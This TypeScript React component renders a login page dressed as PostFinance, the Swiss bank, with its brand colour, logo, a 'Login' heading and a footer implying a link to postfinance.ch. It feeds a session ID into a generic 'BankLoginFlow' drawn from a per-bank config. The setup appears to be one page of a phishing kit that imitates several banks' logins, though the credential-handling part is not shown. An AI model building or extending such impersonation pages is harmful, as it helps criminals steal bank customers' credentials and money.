import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { postfinance } from '@/config/banks/postfinance';

type Props = { sessionId: string };

export default function PostFinance({ sessionId }: Props) {
    return (
        <div className="flex min-h-screen flex-col bg-white">
            <header className="bg-[#FFCC00] px-6 py-4">
                <img
                    src={postfinance.brand.logoPath}
                    alt={postfinance.displayName}
                    className="h-10"
                />
            </header>
            <main className="mx-auto mt-10 w-full max-w-2xl px-4">
                <h1 className="mb-6 text-2xl font-semibold text-[#004B5A]">Login</h1>
                <BankLoginFlow bank={postfinance} sessionId={sessionId} />
            </main>
            <footer className="mx-auto mt-auto w-full max-w-2xl px-4 py-6 text-sm text-gray-500">
                zu postfinance.ch · Live-Support
            </footer>
        </div>
    );
}
